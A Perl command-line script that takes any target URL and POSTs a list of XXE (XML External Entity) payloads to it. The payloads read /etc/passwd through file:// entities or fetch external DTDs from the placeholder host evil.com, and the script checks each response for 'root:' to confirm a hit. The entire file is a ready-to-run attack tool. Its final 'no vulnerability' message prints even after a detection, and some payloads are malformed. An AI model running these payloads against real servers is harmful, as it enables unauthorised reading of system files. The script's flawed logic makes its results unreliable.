#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;
use Term::ANSIColor;

# Prompt for the target website URL
print color('bold blue'), "Enter your target website URL: ", color('reset');
my $url = <STDIN>;
chomp($url);

# List of payloads
my @payloads = (
    "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
    "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><test>&xxe;</test>",
    "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY % remote SYSTEM 'http://evil.com/xxe'> %remote;]><test>&xxe;</test>",
    "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY % remote SYSTEM 'http://evil.com/xxe'> %remote;]><test>&remote;</test>",
    "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY % file SYSTEM 'file:///etc/passwd'><test>&file;</test>]",
    "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/xxe'> %xxe;]><foo>&xxe;</foo>",
    "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY % dtd SYSTEM 'http://example.com/xxe.dtd'> %dtd;]><test>&all;</test>",
    "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY % data SYSTEM 'file:///etc/passwd'> %data;]><foo>&data;</foo>"
);

# Create a new UserAgent object
my $ua = LWP::UserAgent->new;

# Iterate over payloads and test for XXE vulnerability
foreach my $payload (@payloads) {
    # Create an HTTP request object with the payload
    my $request = HTTP::Request->new(POST => $url);
    $request->header('Content-Type' => 'text/xml');
    $request->content($payload);

    # Print the HTTP request details
    print color('bold blue'), "\n[+] Sending HTTP request with payload to $url:\n", color('reset');
    print $request->as_string;

    # Send the HTTP request and capture the response
    print color('bold blue'), "\n[+] Waiting for response from the server...\n", color('reset');
    my $response = $ua->request($request);

    # Print the HTTP response details
    print color('bold blue'), "\n[+] Received HTTP response:\n", color('reset');
    print $response->as_string;

    # Check if the response contains any sensitive information
    if ($response->content =~ /root:/) {
        print color('bold red'), "\n[!] XXE vulnerability detected with payload:\n$payload\n", color('reset');
        last; # Stop testing if vulnerability detected
    }
}

# If no vulnerability detected after trying all payloads
print color('bold green'), "\n[+] No XXE vulnerability detected on the target website.\n", color('reset');
